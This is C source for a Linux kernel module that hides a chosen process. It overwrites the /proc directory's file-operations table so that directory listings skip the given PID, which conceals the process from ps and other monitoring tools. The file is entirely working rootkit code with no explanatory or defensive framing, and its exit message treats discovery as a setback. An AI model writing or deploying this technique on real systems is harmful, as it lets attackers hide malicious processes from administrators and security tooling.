#include "hide.h"

static struct file *file = NULL;

static char *pid_hide;
module_param(pid_hide, charp, 0660);
MODULE_PARM_DESC(pid_hide, "Pid to hide");

struct file_operations my_fo;
struct file_operations *old_fops;

int (*old_actor)(struct dir_context *ctx, const char *name, int nlen,
		loff_t off, u64 ino, unsigned x) = NULL;

int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
	u64 ino, unsigned x)
{
	if (strcmp(name, pid_hide) == 0) 
		return 0;
	else
		return old_actor(ctx, name, nlen, off, ino, x);
}

int my_iterate(struct file *fp, struct dir_context *ctx)
{
	int bk;

	old_actor = ctx->actor;
	ctx->actor = my_actor;

	bk = old_fops->iterate_shared(fp, ctx);

	ctx->actor = old_actor;

	return bk;
}

static int __init hide_init(void)
{
	file = filp_open("/proc", O_RDONLY, 0);
	if(!file)
		goto ERROR1;

	old_fops = file->f_inode->i_fop;
	memcpy(&my_fo, file->f_inode->i_fop, 
		sizeof(struct file_operations));

	my_fo.iterate_shared = my_iterate;

	file->f_inode->i_fop = &my_fo;

	return 0;

ERROR1:
	return -1;
}

static void __exit hide_exit(void)
{
	pr_info("I was found out, snap !\n");
	file->f_inode->i_fop = old_fops;
}